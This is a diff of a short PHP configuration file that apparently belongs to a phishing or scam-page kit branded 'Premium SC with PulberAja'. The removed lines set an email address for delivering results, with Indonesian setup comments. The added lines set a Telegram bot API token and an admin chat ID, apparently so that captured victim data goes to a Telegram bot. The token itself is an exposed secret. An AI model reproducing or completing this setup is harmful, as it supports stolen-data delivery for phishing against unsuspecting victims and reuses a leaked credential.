@@ -1,21 +1,4 @@
 <?php
-$pulberaja = 'frpreza01@gmail.com';// GANTI EMAIL KAMU DISINI
-
-
+$API_KEY = "5250059854:AAF-04PNzIFWHi-gCSIPfBCwo9tQ5I0UT50";//YOUTOKEN
+$admin = "5269303176" ; //YOURID
 ?>
-
-
-<!-- TUTORIAL -->
-
-<?php
-$tutorial = 'BERGUNA LAH'
-
-
-// Bila ingin tahu send 2 mail tidak nya silahkan cek di Track Delivery di cPanel agar tau anda para perusak reputasi yang bialng send 2 mail
-
-// Premium SC with PulberAja
-
-// Pembuat: Nanang
-?>
-
-
